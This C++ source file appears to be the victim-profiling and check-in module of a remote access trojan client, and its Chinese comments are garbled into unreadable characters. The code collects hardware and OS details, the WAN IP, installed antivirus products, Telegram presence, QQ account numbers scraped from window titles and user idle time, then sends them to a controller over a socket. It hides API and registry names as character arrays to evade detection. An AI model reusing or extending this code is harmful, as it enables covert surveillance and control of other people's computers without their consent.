#include "../stdafx.h"
#include "../Declare.h"   //��̬���ÿ⺯��
#include <wininet.h>
#include <vfw.h>
#include "until.h"
#include "decode.h"
#include <iphlpapi.h> //��������ͷ
#pragma comment ( lib, "iphlpapi.lib" ) 
#pragma comment(lib, "vfw32.lib")
#include "../Myfunction.h"  //�Զ��庯��
/*************�ж���Ƶ��ͷ�ļ�*******************/
#include <strmif.h>
#include <uuids.h>
#pragma comment(lib, "strmiids.lib")
/**********************************/
#include <TCHAR.h>

extern Myfunction *pMyfunction;
extern FARPROC MyGetProcAddressA(LPCSTR lpFileName, LPCSTR lpProcName);

extern MODIFY_DATA modify_data;

typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// �汾��Ϣ
	DWORD			dwCPUClockMhz;	// CPUƵ��
	int				nCPUNumber;		// CPU����
	IN_ADDR			WanIPAddress;	// �洢32λ��IPv4�ĵ�ַ���ݽṹ(����)
	IN_ADDR			LanIPAddress;	// �洢32λ��IPv4�ĵ�ַ���ݽṹ(����)
	char			HostName[256];	// ������
	bool			bIsWebCam;		// �Ƿ�������ͷ
	DWORD			dwSpeed;		// ����
	DWORD			Speed;		    // ����
	DWORD			MemSize;		// �ڴ��С
	DWORD			DriverSize;		// Ӳ������
	char			UpGroup[50];	// ���߷���
	char			RunTime[32];	// ����ʱ��
	char			szVersion[32];	// ���߰汾
	char            Virus[50];
	BOOL            bIs64;          // 32λor 64λ 1Ϊ64 0Ϊ32     
	char			MarkTime[50];   // ����˰�װʱ��
	CHAR szQQNum[256];     //��ǰ���е�QQ����
	BOOL  bIsActive;	   //�û�״̬
	TCHAR sznet[20];       //net type
	IN_ADDR	    	IPAddress;	// �洢32λ��IPv4�ĵ�ַ���ݽṹ
}LOGININFO;

///////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////
// Get System Information
DWORD CPUClockMhzT()
{
	char str1[256]="~M";
	char str2[256]="Hz";
	strcat(str1,str2);

	char xYKTm[] = {'H','A','R','D','W','A','R','E','\\','D','E','S','C','R','I','P','T','I','O','N','\\','S','y','s','t','e','m','\\','C','e','n','t','r','a','l','P','r','o','c','e','s','s','o','r','\\','0','\0'};
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, xYKTm, 0, KEY_QUERY_VALUE, &hKey);
	RegQueryValueEx(hKey, str1, NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}

//ö����Ƶ�豸
//////////////////////////////////////////////////////////
UINT EnumDevices()
{
	UINT nCam = 0;
	CoInitialize(NULL);    //COM ���ʼ��
	/////////////////////    Step1        /////////////////////////////////
	//ö�ٲ����豸
	ICreateDevEnum *pCreateDevEnum;                          //�����豸ö����
	//�����豸ö�ٹ�����
	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum,    //Ҫ������Filter��Class ID
		NULL,                                                //��ʾFilter�����ۺ�
		CLSCTX_INPROC_SERVER,                                //����������COM����
		IID_ICreateDevEnum,                                  //��õĽӿ�ID
		(void**)&pCreateDevEnum);                            //�����Ľӿڶ����ָ��
	if (hr != NOERROR)
	{
		//	d(_T("CoCreateInstance Error"));
		return FALSE;
	}
	/////////////////////    Step2        /////////////////////////////////
	IEnumMoniker *pEm;                 //ö�ټ�����ӿ�
	//��ȡ��Ƶ���ö����
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
	//������ȡ��Ƶ���ö��������ʹ�����´���
	//hr=pCreateDevEnum->CreateClassEnumerator(CLSID_AudioInputDeviceCategory, &pEm, 0);
	if (hr != NOERROR)
	{
		//d(_T("hr != NOERROR"));
		return FALSE;
	}
	/////////////////////    Step3        /////////////////////////////////
	pEm->Reset();                                            //����ö������λ
	ULONG cFetched;
	IMoniker *pM;                                            //������ӿ�ָ��
	while(hr = pEm->Next(1, &pM, &cFetched), hr==S_OK)       //��ȡ��һ���豸
	{
		IPropertyBag *pBag;                                  //����ҳ�ӿ�ָ��
		hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
		//��ȡ�豸����ҳ
		if(SUCCEEDED(hr)) 
		{
            VARIANT var;
            var.vt = VT_BSTR;                                //������Ƕ���������
            hr = pBag->Read(L"FriendlyName", &var, NULL);
			//��ȡFriendlyName��ʽ����Ϣ
            if (hr == NOERROR) 
            {
				nCam++;
				SysFreeString(var.bstrVal);   //�ͷ���Դ���ر�Ҫע��
            }
            pBag->Release();                  //�ͷ�����ҳ�ӿ�ָ��
        }
        pM->Release();                        //�ͷż�����ӿ�ָ��
    }
	CoUninitialize();                   //ж��COM��
	return nCam;
}
//////////////////////////////////////////////////////////

bool IsWebCam()
{
	bool	bRet = false;

	if (EnumDevices()>0)
	{
        bRet = TRUE;
	}
	return bRet;
}

BOOL GetOSVerIs64Bit() //��ȡϵͳƽ̨
{
	BOOL bRet=FALSE;
	SYSTEM_INFO si;
	typedef VOID(__stdcall*GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);
	GETNATIVESYSTEMINFO fnGetNativeSystemInfo;
    char yGyioJf[] = {'G','e','t','N','a','t','i','v','e','S','y','s','t','e','m','I','n','f','o','\0'};
	fnGetNativeSystemInfo=(GETNATIVESYSTEMINFO)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")),yGyioJf);
	if (fnGetNativeSystemInfo!=NULL)
	{
		fnGetNativeSystemInfo(&si);
		if(si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64 )
		{
			bRet=TRUE;
		}
	}
	return bRet;
}

int GetNetwork()//��ȡ��������Mbps 
{
        DWORD dwSize = 0;
        DWORD dwRetVal = 0;
        DWORD speed = 0; 
        DWORD dwspeed = 0;
        MIB_IFTABLE *pIfTable;
        MIB_IFROW *pIfRow;       
        
        pIfTable = (MIB_IFTABLE *) malloc(sizeof (MIB_IFTABLE));
        if (pIfTable == NULL) 
        {
                return 1;
        }
        dwSize = sizeof (MIB_IFTABLE);
        if (GetIfTable(pIfTable, &dwSize, FALSE) == ERROR_INSUFFICIENT_BUFFER) 
        {
                free( pIfTable);
                pIfTable = (MIB_IFTABLE *) malloc(dwSize);
                if (pIfTable == NULL) 
                {
                        return 1;
                }
        }

        if ((dwRetVal = GetIfTable(pIfTable, &dwSize, FALSE)) == NO_ERROR) 
        {        
                pIfRow = (MIB_IFROW *) & pIfTable->table[0];
                speed = pIfRow->dwSpeed;
                dwspeed = speed/1000/1000; //mbps        
        } 
        if (pIfTable != NULL) 
        {
                free(pIfTable);
                pIfTable = NULL;
        }
        
        return dwspeed;
}

/////////////////ɱ����ʾ//////////////////////////////////
typedef struct
{
	char *Course;
	char *Name;
}AYSDFE;

AYSDFE g_Ayadfe_Datas[40] =
{
    {"360tray.exe",       "360��ʿ"},
    {"360sd.exe",         "360ɱ��"},
    {"kxetray.exe",       "��ɽ����"},
    {"KSafeTray.exe",     "��ɽ��ȫ��ʿ"},
    {"QQPCRTP.exe",       "QQ���Թܼ�"},
    {"HipsTray.exe",      "����"},
    {"BaiduSd.exe",       "�ٶ�ɱ��"},
    {"baiduSafeTray.exe", "�ٶ���ʿ"},
    {"KvMonXP.exe",       "����"},
    {"RavMonD.exe",       "����"},
    {"QUHLPSVC.EXE",      "QuickHeal"},   //ӡ��
    {"mssecess.exe",      "΢��MSE"},
    {"cfp.exe",           "Comodoɱ��"},
    {"SPIDer.exe",        "DR.WEB"},      //��֩��
    {"acs.exe",           "Outpost"},
    {"V3Svc.exe",         "����ʿV3"},
    {"AYAgent.aye",       "��������"},
    {"avgwdsvc.exe",      "AVG"},
    {"f-secure.exe",      "F-Secure"},    //�Ұ�ȫ
    {"avp.exe",           "����"},
    {"Mcshield.exe",      "�󿧷�"},
    {"egui.exe",          "NOD32"},
    {"knsdtray.exe",      "��ţ"},
    {"TMBMSRV.exe",       "����"},
    {"avcenter.exe",      "С��ɡ"},
    {"ashDisp.exe",       "Avast���簲ȫ"}, 
    {"rtvscan.exe",       "ŵ��"}, 
    {"remupd.exe",        "��è��ʿ"},
    {"vsserv.exe",        "BitDefender"}, //BD  bdagent.exe
    {"PSafeSysTray.exe",  "PSafe������"}, //����
    {"ad-watch.exe",      "Ad-watch�����"}, 
    {"K7TSecurity.exe",   "K7ɱ��"}, 
    {"UnThreat.exe",      "UnThreat"},    //��������
    {"Telegram.exe",      ""},
    {"  ",                "  "}
};

unsigned long GetProcessID(const char* processName);
char* GetVirus()
{
    static char AllName[1024];
    int t = 0;
    int foundSoftware = 0;
    int telegramExists = 0;
    memset(AllName, 0, sizeof(AllName));
    if (GetProcessID("Telegram.exe"))
    {
        strcat(AllName, "�ɻ�����/ ");
        telegramExists = 1;
    }
    else
    {
        strcat(AllName, "NULL/ ");
    }

    while (g_Ayadfe_Datas[t].Course[0] != ' ')
    {
        if (GetProcessID(g_Ayadfe_Datas[t].Course))
        {
            strcat(AllName, g_Ayadfe_Datas[t].Name);
            strcat(AllName, " ");
            foundSoftware = 1;
        }
        t++;
    }
    if (!foundSoftware)
    {
        strcat(AllName, "---");
    }
    
    return AllName;
}
void ReadRegExg(LPCTSTR lpServiceName ,LPTSTR lpSame ,LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024]={0};
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	//	char JYvni08[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
	char JYvni08[] = {'S','Y','S','T','E','M','\\','S','e','l','e','c','t','\0'};
 	wsprintf(strSubKey, JYvni08,lpServiceName);
 	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey,lpSame, REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
}

UINT GetHostRemark(LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024] = "SYSTEM\\Setup";
	memset(lpBuffer, 0, uSize);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
	
	if (lstrlen(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);
	
	return lstrlen(lpBuffer);
}

char* GetInfo(LPCTSTR lpKeyName, LPCTSTR lpServiceName)
{
	char	strValue[1024]={0};
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	
	if(!ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, lpKeyName, REG_SZ, (char *)strValue, NULL, 1024, 0))
		return "";
	return	strValue;
}

UINT GetGroupName(LPTSTR lpBuffer, UINT uSize)
{	
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	
	wsprintf(strSubKey,"%s%s%s%s", "SYST", "EM\\CurrentContro", "lSet\\Services\\", "BITS");
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, modify_data.szGetGroup , REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
	
	return lstrlen(lpBuffer);
}

UINT GetMarkTime(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char JYvni04[] = {'M','a','r','k','T','i','m','e','\0'};
	ReadRegExg(lpServiceName ,JYvni04 ,lpBuffer, uSize);
	if (lstrlen(lpBuffer) == 0)
	{
		pMyfunction->my_strcpy(lpBuffer,"����Ϣ");
	}
	return lstrlen(lpBuffer);
}

BOOL GetNtVersionNumbers(DWORD& dwMajorVer, DWORD& dwMinorVer,DWORD& dwBuildNumber)
{
    BOOL bRet= FALSE;
    HMODULE hModNtdll= NULL;
    if (hModNtdll= ::LoadLibraryW(L"ntdll.dll"))
    {
        typedef void (WINAPI *pfRTLGETNTVERSIONNUMBERS)(DWORD*, DWORD*, DWORD*);
        pfRTLGETNTVERSIONNUMBERS pfRtlGetNtVersionNumbers;
        pfRtlGetNtVersionNumbers = (pfRTLGETNTVERSIONNUMBERS)::GetProcAddress(hModNtdll, "RtlGetNtVersionNumbers");
        if (pfRtlGetNtVersionNumbers)
        {
			pfRtlGetNtVersionNumbers(&dwMajorVer, &dwMinorVer, &dwBuildNumber);
			dwBuildNumber &= 0x0ffff;
			bRet = TRUE;
        }
		
        ::FreeLibrary(hModNtdll);
        hModNtdll = NULL;
    }
	
    return bRet;
}

BOOL GetWanIPAddress(IN_ADDR *WanIPAddress)
{
	char iOagR[]={'W','I','N','I','N','E','T','.','d','l','l','\0'};
	char JYvni[]={'I','n','t','e','r','n','e','t','O','p','e','n','A','\0'};
	InternetOpenAT pInternetOpenA=(InternetOpenAT)MyGetProcAddressA(iOagR,JYvni);
	
	char dTyuB[]={'I','n','t','e','r','n','e','t','O','p','e','n','U','r','l','A','\0'};
	InternetOpenUrlAT pInternetOpenUrlA=(InternetOpenUrlAT)MyGetProcAddressA(iOagR,dTyuB);
	
	char lJvdZ[]={'I','n','t','e','r','n','e','t','Q','u','e','r','y','D','a','t','a','A','v','a','i','l','a','b','l','e','\0'};
	typedef BOOL (WINAPI *InternetQueryDataAvailableT)(HINTERNET hFile,LPDWORD lpdwNumberOfBytesAvailable,DWORD dwFlags,DWORD dwContext);
	InternetQueryDataAvailableT pInternetQueryDataAvailable=(InternetQueryDataAvailableT)MyGetProcAddressA(iOagR,lJvdZ);
	
	char eTgDv[]={'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e','\0'};
	InternetReadFileT pInternetReadFile=(InternetReadFileT)MyGetProcAddressA(iOagR,eTgDv);
	
	char aJopX[]={'I','n','t','e','r','n','e','t','C','l','o','s','e','H','a','n','d','l','e','\0'};
	InternetCloseHandleT pInternetCloseHandle=(InternetCloseHandleT)MyGetProcAddressA(iOagR,aJopX);
	
	char szUrl[] = {'h','t','t','p',':','/','/','w','w','w','.','t','a','o','b','a','o','.','c','o','m','/','h','e','l','p','/','g','e','t','i','p','.','p','h','p','\0'};
	HINTERNET hInternet;
	HINTERNET hHttpFile;
	char *szHttpBuffer;
	DWORD dwHttpBufferLen;
	DWORD dwBytesRead;
	char *ip_start;
	char *ip_stop;
	
	hInternet = pInternetOpenA(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet == NULL)
		return FALSE;
	hHttpFile = pInternetOpenUrlA(hInternet, szUrl, NULL, 0, INTERNET_FLAG_RELOAD, NULL);
	if (hHttpFile == NULL)
	{
		pInternetCloseHandle(hInternet);
		return FALSE;
	}
	if (!pInternetQueryDataAvailable(hHttpFile, &dwHttpBufferLen, 0, 0))
	{
		pInternetCloseHandle(hHttpFile);
		pInternetCloseHandle(hInternet);
		return FALSE;
	}
	szHttpBuffer = new char[dwHttpBufferLen+1];
	memset(szHttpBuffer, 0, dwHttpBufferLen+1);
	if (!pInternetReadFile(hHttpFile, szHttpBuffer, dwHttpBufferLen, &dwBytesRead))
	{
		delete[] szHttpBuffer;
		pInternetCloseHandle(hHttpFile);
		pInternetCloseHandle(hInternet);
		return FALSE;
	}
	pInternetCloseHandle(hHttpFile);
	pInternetCloseHandle(hInternet);
	ip_start = strchr(szHttpBuffer, '\"');
	ip_stop = strrchr(szHttpBuffer, '\"');
	if (ip_start!=NULL && ip_stop!=NULL)
	{
		ip_start++;
		*ip_stop = '\0';
		ULONG Addr = inet_addr(ip_start);
		delete[] szHttpBuffer;
		if (Addr != INADDR_NONE)
		{
			WanIPAddress->S_un.S_addr = Addr;
			return TRUE;
		}
	}
	delete[] szHttpBuffer;
	return FALSE;
}

TCHAR *ConnectionKind()
{
	DWORD flags;
	if (InternetGetConnectedState(&flags, 0))
	{
		if ((flags & INTERNET_CONNECTION_MODEM) == INTERNET_CONNECTION_MODEM)
		{
			return _T("MODEM ����");
		}
		else if ((flags & INTERNET_CONNECTION_LAN) == INTERNET_CONNECTION_LAN)
		{
			return _T("LAN ����");
		}
		else if ((flags & INTERNET_CONNECTION_PROXY) == INTERNET_CONNECTION_PROXY)
		{
			return _T("PROXY ����");
		} else if ((flags & INTERNET_CONNECTION_MODEM_BUSY) == INTERNET_CONNECTION_MODEM_BUSY)
		{
			return _T("BUSY ����");
		}
		else
			return _T("OTHER ����");
	}
}

/////////////////

/////////////////
void clean_string(char *str)//ȥ��β�ո�
{
	char *start = str - 1;
	char *end = str;
	char *p = str;
	while(*p)
	{
		switch(*p)
		{
		case ' ':
		case '\r':
		case '\n':
			{
				if(start + 1==p)
					start = p;
			}
			break;
		default:
			break;
		}
		++p;
	}
	//�����������ַ�����β�� ������ǰ
	--p;
	++start;
	if(*start == 0)
	{
		//�Ѿ����ַ�����ĩβ�� 
		*str = 0 ;
		return;
	}
	end = p + 1;
	while(p > start)
	{
		switch(*p)
		{
		case ' ':
		case '\r':
		case '\n':
			{
				if(end - 1 == p)
					end = p;
			}
			break;
		default:
			break;
		}
		--p;
	}
	memmove(str,start,end-start);
	*(str + (int)end - (int)start) = 0;
}
char * GetQQ()
{
	char QQ[MAX_PATH] = {0};
	char szText[MAX_PATH] = "CTXOPConntion_Class";
    char szQQNumber[MAX_PATH] = {0};
    HWND hWnd = FindWindow(szText, NULL);
    while (hWnd)
    {
		if(strcmp(szText,"CTXOPConntion_Class")==0)
		{
			GetWindowText(hWnd, szText, MAX_PATH);
			int len = strlen(szText);
			do
			{
				len--;
			} while (szText[len] != '_');
			strcpy(szQQNumber, &szText[len+1]);
			strcat(QQ,szQQNumber);
			strcat(QQ," ");
		}
		hWnd=GetWindow(hWnd,GW_HWNDNEXT);
		GetClassName(hWnd,szText,MAX_PATH);
    }
	CloseHandle(hWnd);
	clean_string(QQ);
	if (strlen(QQ) > 4)
		return QQ;
	else
		return "NULL";
}
///////////////////////////////////////////////////////////////////////////

int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed,LPSTR szVersion)
{
	int nRet = SOCKET_ERROR;
	// ��¼��Ϣ
	LOGININFO	LoginInfo;
	memset(&LoginInfo,0,sizeof(LoginInfo));
	// ��ʼ��������
	LoginInfo.bToken = TOKEN_LOGIN; // ����Ϊ��¼
	LoginInfo.bIsWebCam = 0;        // û������ͷ
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // ע��ת������
	GetNtVersionNumbers(LoginInfo.OsVerInfoEx.dwMajorVersion,LoginInfo.OsVerInfoEx.dwMinorVersion,LoginInfo.OsVerInfoEx.dwBuildNumber);
	
	// ������
	char hostname[256];
	GetHostRemark(hostname, sizeof(hostname));
	
	// ���ӵ�IP��ַ
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	if (modify_data.bLanPenetrate) GetWanIPAddress(&LoginInfo.WanIPAddress);
	pMyfunction->my_memcpy(&LoginInfo.LanIPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	pMyfunction->my_memcpy(&LoginInfo.HostName, hostname, sizeof(hostname));
	// CPU
	LoginInfo.dwCPUClockMhz = CPUClockMhzT();
	SYSTEM_INFO SysInfo; // ���ڻ�ȡCPU������
	GetSystemInfo(&SysInfo);
	LoginInfo.nCPUNumber = SysInfo.dwNumberOfProcessors;
	
	// �ڴ��С
    MEMORYSTATUSEX	MemInfo; // ��GlobalMemoryStatusEx����ʾ2G�����ڴ�
    MemInfo.dwLength=sizeof(MemInfo); 
    GlobalMemoryStatusEx(&MemInfo);
	DWORDLONG strMem = MemInfo.ullTotalPhys/1024/1024;
	LoginInfo.MemSize = (unsigned long)strMem;

	// Ӳ�̿ռ�
	ULARGE_INTEGER nTotalBytes,nTotalFreeBytes,nTotalAvailableBytes;
	unsigned long nAllGB = 0, nFreeGB = 0;
    DWORD drivertype;
    CHAR driver[11];//, strPrint[128];
    for(int i=0; i<26; i++)
    {
		driver[0] = i + ('B');
		driver[1] = (':');
		driver[2] = ('\\');
		driver[3] = 0;
		drivertype = GetDriveType(driver);
        if(drivertype!=DRIVE_FIXED)
			continue;
		GetDiskFreeSpaceEx(driver,&nTotalAvailableBytes,&nTotalBytes,&nTotalFreeBytes);   
		nAllGB = (unsigned long)(nAllGB + nTotalBytes.QuadPart/1024/1024);
//		nFreeGB = nFreeGB + nTotalFreeBytes.QuadPart/1024/1024/1024;  //ʣ�����
    }
	// Ӳ��
	LoginInfo.DriverSize = nAllGB;

	// ����ͷ
	LoginInfo.bIsWebCam = IsWebCam();
	
	// Speed
	LoginInfo.dwSpeed = dwSpeed;

	// ����
	LoginInfo.Speed = GetNetwork();

	// ����װʱ��
	GetMarkTime(modify_data.SerName, LoginInfo.MarkTime, sizeof(LoginInfo.MarkTime));
	
	// 32 or 64
	LoginInfo.bIs64 = GetOSVerIs64Bit();

	// ɱ�����
    strcpy( LoginInfo.Virus, GetVirus() );

	// �ʱ��
	char jsbHj10[] = {'%','d','\0'};
	DWORD t=GetTickCount();
	char day[100];
	char hour[100];
	char min[100];
	wsprintfA(day, jsbHj10, t/86400000);
	t%=86400000;
	wsprintfA(hour,jsbHj10, t/3600000);
	t%=3600000;
	wsprintfA(min, jsbHj10, t/60000);
	wsprintfA(LoginInfo.RunTime, "%s��%sʱ%s��", day, hour,min);

    // ���߰汾

	char *szVerTemp = MyDecode(szVersion);
		
	strcpy(LoginInfo.szVersion, szVerTemp);
	free(szVerTemp);

	// ���߷���
	char *UpRow = NULL;
	bool bFree = false;
	char Group[256];
	char strWirn2[] = {'D','e','f','a','u','l','t','\0'};
	if(GetGroupName(Group, sizeof(Group))==0)
	{
		if(modify_data.szGroup != NULL)
		{
				UpRow = (char *)(MyDecode(modify_data.szGroup));
			bFree = true;
		}
		else
		{
			UpRow = strWirn2;
		}
	}
	else
	{
		UpRow=Group;
	}

	strcpy(LoginInfo.UpGroup,UpRow);
	if (bFree) free(UpRow);
	
	// ��ȡQq
	lstrcpy(LoginInfo.szQQNum,GetQQ());

	// �û�״̬
	LoginInfo.bIsActive = false;
	//�Ƿ�
	LASTINPUTINFO lpi;
	lpi.cbSize = sizeof(lpi);
	GetLastInputInfo(&lpi);//��ȡ�ϴ����������ʱ�䡣
	if ((::GetTickCount()-lpi.dwTime)>1000*60*3)//5����
	{
		//��ǰϵͳ�Ѿ�������1����
		LoginInfo.bIsActive = true;
	}

	//net
	lstrcpy(LoginInfo.sznet, ConnectionKind());

	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));
	return nRet;
}
